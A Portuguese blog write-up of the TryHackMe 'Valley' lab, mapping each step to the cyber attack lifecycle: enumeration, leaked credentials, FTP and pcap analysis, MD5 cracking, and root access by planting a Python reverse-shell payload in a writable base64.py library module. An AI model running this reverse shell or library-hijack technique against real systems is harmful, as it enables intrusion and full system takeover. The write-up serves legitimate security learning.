![Valley](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2ekhhzw9tqd1f4glichy.png)
# Máquina valley do TryhackMe  e o ciclo de vida de um ciberataque
Quando se pensa em um ciberataque podemos imaginar principalmente sobre a metodologia utilizada por um determinado atacante. Desta maneira, traçar os passos que foram adotados até suceder o ataque é muito importante, se questionando sobre **o que o atacante faria?** diante por exemplo de uma aplicação web, que é justamente o nosso alvo exemplo. O principal objetivo desse texto é dissecar o processo até o encontro das flags da hacking lab, mas assimilando com os conceitos de [**Cyber Attack Lifecycle**](https://www.iacpcybercenter.org/resource-center/what-is-cyber-crime/cyber-attack-lifecycle/), já que podemos observar como o nosso atacante poderia operar nesse contexto. Logo, a ideia é trazer essa pequena percepção de um ciberataque do mundo real, mas de maneira bem **simples** e é claro que de **maneira legal**, com a room [**Valley**](https://tryhackme.com/r/room/valleype), da plataforma TryHackMe.

## Introdução
Antes de começar o processo de análise e resolução da máquina é importante explicar o que seria um Cyber Attack Lifecycle ou Attack Lifecycle (Ciclo de vida do ataque cibernético / Ciclo de vida do ataque), porque é justamente a partir dessa metodologia que se inicia os passos de invasão à máquina Valley.

Uma metodologia na perspectiva de um hacking ético é basicamente mapear o processo de um ataque, de acordo com o contexto e objetivo do autor. Deste modo, iremos usar como base um modelo bem interessante: **Attack Lifecycle**, através dele podemos observar de maneira detalhada o passo a passo do invasor.


### Attack Lifecycle
---
![Modelo de ciclo de um ataque](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2fow7hmqzdt86i9yd7y7.jpg)
É muito interessante como este modelo descreve, de maneira sucinta e bastante objetiva como um explorador executa seu respectivo ataque. Uma curiosidade pontuada é que um possível ataque não é único, assim como é tratado no livro do **Ric Messier** intitulado **CEH v12 Certified Ethical Hacker Study Guide with 750 Practice Test Questions**, ou seja, muito provavelmente o mesmo não irá com objetivo de realizar apenas um ataque e pronto, o **one-and-done**, mas sim a partir de um determinado ataque continuar buscando novas brechas. Neste processo iremos realizar a análise de etapa por etapa através da própria máquina juntamente com as definições.

### Initial Recon 
---
O Initial Recon (reconhecimento inicial) é justamente o momento em que buscamos informações sobre o alvo. Dessa maneira, quais informações podemos retirar sobre a vítima? 

![Página inicial da Valley Photo](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rqchu1349ai45ujtwap4.png)
Aqui podemos ter algumas informações, a primeira é se tratando de uma empresa com foco em fotografias, a **Valley Photo Co.**, uma aplicação web, que curiosamente é via [**HTTP**](https://www.alura.com.br/artigos/http), com isso já podemos tirar que os dados ali transmitidos não são criptografados, com isso podemos tentar buscar informações de possíveis dados sensíveis,  além de possuir três rotas que são: **/index.html**, **/gallery/gallery.html** e **/pricing/pricing.html**.
O index.html nos trás as informações referentes a página principal da aplicação.
No gallery.html temos algumas imagens que fazem parte também da rota **/static/** de armazenamento de arquivos e que vai "**hipoteticamente**" do 1 até até o 18.

![Galeria de imagens](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8yr30ytf7eecxmgsrved.png)

![Rota /static e imagem 1](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/b80wd2plq37h99f2tnu4.png)
Enquanto no /pricing.html temos as informações dos valores cobrados pela empresa Valley e informações em uma nota misteriosa se for digitado apenas o IP do alvo + rota /pricing e que informa sobre uma pessoa chamada  RP que solicita  a J para parar de deixar notas em lugares aleatórios do website. Essa informação deduz que provavelmente terá informações expostas sobre a aplicação em algum lugar e que para isso teremos que usar alguma ferramenta para encontrá-las.

![Rota pricing](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lvgnxcmvrbccuh17bhqa.png)

![Index da rota pricing](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/k1e4djv7qart7mew7mwr.png)

![Nota.txt](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/imswizmzjewzo73p2vue.png)
Além disso, podemos presumir que a linguagem que está sendo executada nessa aplicação é **Javascript** em virtude do que foi visto no inspect da aplicação e no próprio html.


![inspect](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/65se3egrvrsreggffp31.png)




### Ferramentas
---
Com a finalização de um reconhecimento inicial mais simples, buscando informações próprias no alvo, iremos partir para a utilização de ferramentas como **dirb**, **ffuf**, etc., que possam primeiramente verificar as rotas, ou seja, uma **enumeração**, para coletar informações sobre a aplicação, identificar as rotas que estão disponíveis, diretórios, qualquer informação oculta que possa contribuir no entendimento do alvo e formas de entrada para um ataque.
```bash
dirb http://alvo/ /usr/share/wordlists/dirb/common.txt
dirb http://alvo/pricing /usr/share/wordlists/dirb/common.txt
dirb http://alvo/gallery /usr/share/wordlists/dirb/common.txt


ffuf -w /usr/share/wordlists/dirb/common.txt -u http://alvo/FUZZ
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://alvo/pricing/FUZZ
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://alvo/gallery/FUZZ
```

A principal informação estará justamente na rota /static.

![Ferramenta dirb](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/srqnd41976txsnif776t.png)

![Ferramenta ffuf](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hwb45nvvbmmvkx5ktb5e.png)

![dev notes](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lvh6jnthqa3fypwm4ce0.png)
Aqui temos informações não muito usuais e que confirma a **note.txt** de que teríamos uma nota perdida em algum lugar e é justamente a rota **/static/00** que possui essa nota.  Alguns detalhes podem ser analisados aqui, primeiramente por serem tarefas destinadas a um dev da Valley e que foram solicitadas por outro com user ou referenciado por valleyDev. Dentre essas informações podemos tirar como principal o endereço de login **/dev1243224123123**, que não foi removido pela pessoa e consequentemente estaria no ar ainda.

![Tela de login](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/r4411vmt4fed1wbkft28.png)
Usando as próprias ferramentas do navegador, que é o inspect e a análise da rede podemos tirar mais duas rotas que confirmam a utilização de **Javascript** na aplicação. Se tentar usar as ferramentas anteriores terá dificuldade e provavelmente não irá setar essas rotas disponíveis.

![Inspect - Network](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/v7eefpo6cg5htbtlp9ps.png)

Na rota /dev.js teremos um código bastante interessante:
```javascript
const loginForm = document.getElementById("login-form");
const loginButton = document.getElementById("login-form-submit");
const loginErrorMsg = document.getElementById("login-error-msg");

loginForm.style.border = '2px solid #ccc';
loginForm.style.padding = '20px';
loginButton.style.backgroundColor = '#007bff';
loginButton.style.border = 'none';
loginButton.style.borderRadius = '5px';
loginButton.style.color = '#fff';
loginButton.style.cursor = 'pointer';
loginButton.style.padding = '10px';
loginButton.style.marginTop = '10px';


function isValidUsername(username) {

	if(username.length < 5) {

	console.log("Username is valid");

	}
	else {

	console.log("Invalid Username");

	}

}

function isValidPassword(password) {

	if(password.length < 7) {

        console.log("Password is valid");

        }
        else {

        console.log("Invalid Password");

        }

}

function showErrorMessage(element, message) {
  const error = element.parentElement.querySelector('.error');
  error.textContent = message;
  error.style.display = 'block';
}

loginButton.addEventListener("click", (e) => {
    e.preventDefault();
    const username = loginForm.username.value;
    const password = loginForm.password.value;

    if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
    }
})
```

Neste caso, temos a estilização do botão de login, uma função de validação de username mostrando as características necessárias para o username ser válido, sendo menor do que 5 caracteres e o campo de senha, no caso o password que realiza a validação da senha, neste se faz necessário uma senha com menos de  7 caracteres para ser válido. Entretanto, a informação mais importante é a exposição do username **siemDev** e senha **california**, além de mais uma nota deixada de forma aleatória pelo dev da Valley em um arquivo de texto **/dev1243224123123/devNotes37370.txt**.

No /button.js temos a animação e estilização do botão  login.
```javascript
const button = document.getElementById("homeButton"); // Get the button element
let isAnimating = false; // Set initial animation state

button.addEventListener("click", function() {
  if (!isAnimating) {
    isAnimating = true; // Set animation state to true
    button.style.transform = "scale(1.2)"; // Animate button size
    button.style.opacity = 0.5; // Animate button opacity
    setTimeout(function() {
      button.style.transform = "scale(1)"; // Reset button size
      button.style.opacity = 1; // Reset button opacity
      isAnimating = false; // Set animation state back to false
    }, 1000); // Animation duration in milliseconds
  }
  window.location.href = "/index.html";
});
```

Voltando para as informações mais importantes, no caminho **/dev1243224123123/devNotes37370.txt** se tem mais uma ideia do primeiro caminho a ser tomado e uma etapa bem importante.


![devNotes37370.txt](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tleu8yk5galmxb9dlmab.png)
O primeiro ponto é que essa pessoa costuma reusar as credenciais, a única credencial que foi capturada é a **siemDev** e isso significa que a mesma serve para a porta ftp dessa aplicação. No entanto, não se sabe qual seria a porta ftp, apesar da nota setar para essa possível resposta por não estar em seu "valor" usual, para isso o **nmap** se faz necessário para tentar localizá-la e também verificar as outras portas disponíveis.
```bash
nmap -v -p- alvo
```

![nmap](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/eet5qmuf6iqoggx47nne.png)
A  porta ftp é justamente a porta **37370**, informada para o dev e que está referenciada na nota da rota **/devNotes37370.txt** . Com isso, apenas se faz necessário nesse momento realizar a conexão e adentrar a próxima etapa do ciclo do ataque.


### Initial Compromise e Establish Foothold 
---
A partir do momento em que o invasor realiza esse tipo de ação e consegue o feito de obter acesso ao ftp, já temos ali um **initial compromise** (comprometimento inicial) da aplicação, ainda que não seja o objetivo ideal é  justamente a partir desse princípio que terá a possibilidade de realizar uma elevação de privilégios por exemplo. Quando se pensa na etapa do **establish foothold** (estabelecimento do ponto de apoio) é necessário algo que mantenha esse acesso. Nessa máquina em questão, a manutenção desse acesso se deu pela captura de pacotes de tráfego da rede, realizando a filtragem e análise desses pacotes com **Wireshark** ou **tcpdump**, em busca de credenciais que possam preservar esse acesso.
```bash
ftp [ip] [port]
ftp 00.00.000.00 37370
```
![acesso ao ftp](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/80ytv2tast0wrsd1ecrd.png)
Agora a questão é o que se tem ali e o que pode ser verificado? algo que possa ir contribuindo para o ciclo de ataque do intruso? Exatamente os pacotes de captura de tráfego, na porta ftp.

![pacotes de captura de tráfego](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/53qjko0xmha10cs70frg.png)
E o que foi feito no terminal acima? Primeiramente, a conexão com ftp, colocando as credenciais que foram adquiridas, usando o comando ls para verificar os arquivos ali presentes e por fim o comando mget *  para capturar esses arquivos do ftp para a própria máquina, podendo assim realizar uma analisa melhor desses pacotes. Caso tenha interesse, nesse site possui informações sobre os [comandos básicos do ftp](https://www.cs.colostate.edu/helpdocs/ftp.html).


#### Wireshark
---
```wireshark
(http.request or tls.handshake.type eq 1) and !(ssdp)   

(http.request or tls.handshake.type eq 1 or (tcp.flags.syn eq 1 and tcp.flags.ack eq 0)) and !(ssdp)

(http.request or tls.handshake.type eq 1 or (tcp.flags.syn eq 1 and tcp.flags.ack eq 0) or dns) and !(ssdp)

```


De forma bem breve, não explicando de maneira mais aprofundada sobre o assunto, a ideia aqui são as filtragens para visualizar melhor os arquivos capturados na porta ftp, que foi retirado de um [site indicado](https://unit42.paloaltonetworks.com/using-wireshark-display-filter-expressions/) por um grande colega. O  **(http.request or tls.handshake.type eq 1) and !(ssdp)** realiza a filtragem quanto a requisições de web (HTTP), e início de conexões seguras (TLS), mas ignorando os pacotes de dispositivos SSDP,  **(http.request or tls.handshake.type eq 1 or (tcp.flags.syn eq 1 and tcp.flags.ack eq 0)) and !(ssdp)** realiza a filtragem incluindo os mesmos do primeiro, mas com a diferença de  incluir conexões TCP que estão tentando ser abertas (os pacotes SYN), mas sem o ACK. Quanto ao  **(http.request or tls.handshake.type eq 1 or (tcp.flags.syn eq 1 and tcp.flags.ack eq 0) or dns) and !(ssdp)** inclui pacotes que envolvam o dns. Com isso temos a objetividade do que vamos analisar no tráfego e poder visualizar melhor a conversa entre os dispositivos de uma rede.

No arquivo siemFTP.pcapng:

![arquivo siemFTP.pcapng](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rob8zzao0rjdhmbwi2jv.png)

siemHTTP2.pcapng:

![arquivo siemHTTP2.pcapng](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/dgxo5quvbk1b58iit3dw.png)

Foram obtidos dois conteúdos interessantes, o primeiro é o anonymous, que é um login público e que quando um servidor ftp permite esse **acesso anônimo**, o usuário pode conectar sem precisar de um nome de usuário ou senha, mas infelizmente essa possibilidade não foi concretizada, pois esse acesso anônimo foi desabilitado.

![anonymous](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/w46522gzu6fc15shrle2.png)
O segundo conteúdo é usuário **valleyDev** e senha **ph0t0s1234**, no entanto se você tentar acessá-lo na dinâmica de porta ftp irá receber um erro, em virtude de um mecanismo de segurança que impede esse acesso a este determinado usuário. A questão que fica é será  que não existe outro lugar para efetuar esse login? Se voltarmos a varredura de portas, lembraremos que a porta 22 do ssh está aberta.

![Porta 22 ssh](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5ce0nkigd1zf6xogped8.png)
Por se tratar de  uma porta ssh, o mesmo necessita de um login e senha. É através dessa porta  que será feita a primeira escalada de privilégio, com as credenciais obtidas através da análise dos pacotes anteriores.


### Escalate Privileges
--- 
O **escalate privileges** (elevação de privilégios) se deu por todo um processo de coleta de informações, com isso tendo as filtragens corretas e que fossem possíveis esse comprometimento maior da aplicação. A ideia a partir daqui é conseguir chegar até a raiz e no primeiro contato com a porta ssh, já teremos a primeira flag, no arquivo **user.txt**, com a ajuda do usuário valleyDev.

![ssh valleyDev](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/82oxrv38qa4xt3hhngvo.jpeg)
Após esse primeiro contato poderia se pensar que a missão estaria finalizada para um possível invasor, porém a ideia é pensar no quanto é possível extrair das informações ali presentes e como efetivar essa escalada de privilégios até chegar no "super Admin" e ter acesso total.

### Internal Recon 
---
Antes de pensar em outro processo de elevação desses privilégios, é importante ressaltar sobre a varredura das portas feita anteriormente e em como será a dinâmica nesse contexto, além de análise de usuários, etc.

![Porta 22 ssh](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5pftokkahy0937xhkmmx.png)
O serviço ssh dessa aplicação usa como sistema operacional o Linux.

Durante esse processo de **initial recon** (reconhecimento interno) e funcionamento do serviço se pode pensar sobre a questão dos usuários presentes no serviço e um bastante curioso é o usuário valley, que se tornará a ponte até o o root.

![valleyDev@valley](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/63jf2r5p1lwu80w39dtg.png)
Existem dois pontos importantes dessa análise, o primeiro é o arquivo executável valleyAuthenticator, que foi compactado usando o upx. Esse é o ponto de partida para conseguir um usuário com um pouco mais de permissão.

![ELF 64 bits](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2sez9js3liq84uf3qo5m.png)

![UPX](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qrenm7dje1fgph1e75vr.png)
O segundo é o diretório **/usr/lib/python3.8/**, nele contém bibliotecas e módulos python. A partir dele podemos pensar em usar um reverse shell e tentar acesso ao root, mas para isso precisamos verificar um usuário que possa dar permissões adicionais que o usuário valleyDev não pode oferecer, para pelo menos editar algum arquivo .py vinculado a um super usuário que dê esse acesso final a raiz.

![arquivo base64.py](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/uf9d0nuum6yajh9bf2vt.png)

![base64.py permission denied](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tef91pnk5nqc8sgqg68e.png)
### Move laterally e Maintain Presence 
---
A ideia do **move laterally** (movimentação lateral ) e **maintain presence** (manter presença) se dá pelo objetivo de conseguir um novo usuário que terá as permissões necessárias para chegar no objetivo final e esse processo se inicia na decodificação do valleyAuthenticator. A movimentação parte da exploração e comprometimento de outros sistemas na mesma rede ou infraestrutura, além do sistema atual que já possui o acesso, porém nesse contexto da máquina, o fato de obter um novo usuário que tenha certos privilégios acaba sendo esse movimento lateral, pois o mesmo terá recursos que o usuário valley não possuía. Enquanto a etapa de manter presença é justamente garantir esse acesso que se tem ao sistema comprometido e manter essa continuidade de ataque e até mesmo retorno ao sistema sem ter suas atividades finalizadas ou possibilidade de ser detectado.

Nesse caso precisamos conseguir trazer o arquivo **valleyAuthenticator** para a própria máquina e realizar a análise com a ferramenta **upx** e  visualizar melhor o que será entregue e se existe algum tipo de informação que possa contribuir nessa etapa.
Para realizar esse processo a utilização do comando pytho3 -m http.server porta, se faz necessário para que seja iniciado um servidor web bem simples com python e consiga capturar arquivos para própria máquina que está no serviço ssh.
```python
Terminal 1
python3 -m http.server [porta de sua escolha]
```

```python
Terminal 2
wget http://ip:porta/valleyAUthenticator
```

![ptyon3 -m http.server](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/0tfl06r5bkj188u9u463.jpeg)

![wget](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/184dhltwxc1pgfrd26ho.png)
Depois de baixar o arquivo diretamente para a máquina é necessário decodificá-lo primeiro usando a ferramenta upx e após isso ler com o comando strings.
```bash
upx -d arquivo
strings arquivo
```

![upx -d](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hijwnxyqdyashmy6wxa4.png)
Após isso, se tem a busca de informações através do autenticador da valley, quanto a um usuário, algo codificado ou encriptado e que possa ser efetivado o encontro do valor original.  A informação necessária se encontra no início de uma autenticação que ficou registrada nesse arquivo, e usando um hash analyzer, pode ser obtida a informação de que é uma hash MD5. Por fim, apenas é realizada a descoberta do valor original das duas hashes, que são a senha e o usuário.

![hashes](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qp64ycd8mxmcftqhpnsv.png)

![hash analyzer](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/27ucp7fa66piekfh214u.png)

![decode md5](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/bqcmirhzjofoeej34f5r.png)

![decode md5](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/nj5gwykc48a8z010387j.png)
Com sucesso foi obtido o usuário com permissões um pouco melhores do que a do valleyDev, o usuário **valley** e mais uma **elevação de privilégios**.
![ssh](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/oj65g07taz3jxygy4fk4.png)

O objetivo maior agora é conseguir chegar até a raiz e acessar a última flag. Ao observar novamente o diretório do **python3.8** em **/usr/lib/python3.8**,  o arquivo **base64.py** do usuário valleyAdmin se encontra mais acessível. Com o usuário valley, esse arquivo pode ser modificado e usado como ponte para realizar a última **escalada de privilégios**.
![base64.py](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/v0llk0fiaied7v134xgf.png)

O movimento a ser feito é fazer com que o módulo base64.py ao ser solicitado terá um [payload de reverse shell](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python), que ao ser executado na primeira fileira de código enviará uma conexão de entrada em uma porta específica e retornará no terminal essa conexão, com uma interface de linha de comando (terminal) e com isso a interação com o sistema operacional da aplicação web.
```python
nano base64.py

#!/usr/bin/python3  
  
import socket  
import os  
from os import dup2  
from subprocess import run  
  
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
s.connect(("ip", 3000))  
os.dup2(s.fileno(), 0)  
os.dup2(s.fileno(),1)  
os.dup2(s.fileno(),2)  
run(["/bin/bash", "-i"])

------ restante do código ------
```

![base64.py com payload reverse shell](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/73zanj2nczqmpzhkmj0l.jpeg)


### Final Escalation Privileges e Complete Mission
---
A elevação de privilégios desse contexto se finaliza assim que o o netcat  escuta na porta 3000 e recebe a conexão de entrada feita a partir do arquivo base64.py.
```bash
nc -lvnp 3000
```

![root](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/jpbowthykp15zbqm069u.jpeg)
o arquivo final se encontra no root.txt e ao utilizar o whoami, o mesmo confirma estar na raíz da aplicação. Portanto, a missão e objetivo final foi completado pelo invasor. Entretanto, parte da perspectiva da máquina valley, mas aqui poderia ser novamente mais um ciclo de ataques e busca por dados sensíveis, qualquer informação que seja pertinente. Este é o fim, por causa das flags, mas seria o fim de um ataque real? Como agir nesse contexto, em quais etapas seria interessante visualizar soluções e formas de conter esse ataque maior e mais severo? É claro que esse contexto é bem mais simples e não tão complexo quanto em um cenário real.


### Considerações finais
---
A máquina valley trouxe base para o entendimento do modelo **attack lifecycle**, que caso seja de interesse do leitor, tem um pouco do livro **A arte da guerra** de **Sun Tzu**. A informação é um fator crucial e muito importante, assim como no campo de batalha, não seria diferente em um possível ataque cibernético, no princípio desde o reconhecimento inicial, construindo todas as informações que poderiam ser extraídas naquele contexto sobre o alvo, o comprometimento a partir de uma credencial exposta em uma rota e sendo o ponta pé inicial de invasão e o estabelecimento da conexão, onde será mantido o acesso àquele servidor. A elevação de privilégios, essa etapa voltou em diversos momentos para que culminasse no objetivo final, ou seja, o invasor não pensa em um só  ataque e pronto, não é algo unilateral, parte também da perspectiva de possibilidades que terá a seu favor. Então, as questões ali em conjunto com os privilégios, como o reconhecimento pós uma "melhora" no acesso, a movimentação lateral de tentar mais um usuário que dê a possibilidade de injetar um payload de reverse shell em um módulo python, a manutenção para firmar essa presença nessa aplicação e mais uma escalada desses privilégios até o encontro da ultima flag na raiz. 
Logo, assim como a água não ser constante, **Heráclito** de **Éfeso** diz que você não toma banho duas vezes no mesmo rio, porque esse mesmo rio já passou, se encontra no passado e você já não é o mesmo de ontem. É importante pensar nessa construção de probabilidades de um atacante, de construir e entender o contexto daquilo, porque partir dessa análise mais aberta contribui para uma forma mais clara e objetiva de estacar ou conter um ciberataque. O modelo é um norte, não sendo tudo ali elaborado exatamente daquele jeito, mas pode ser uma referência para guiar nesse processo.


### Referências bibliográficas
---
* **TZU, Sun.** _A arte da guerra_. Tradução de André da Silva Bueno. 2. ed. São Paulo: Editora UNESP, 2009.
* **MESSIER, Ric.** _Certified Ethical Hacker (CEH) v11: Study Guide_. 2. ed. Sybex, 2021.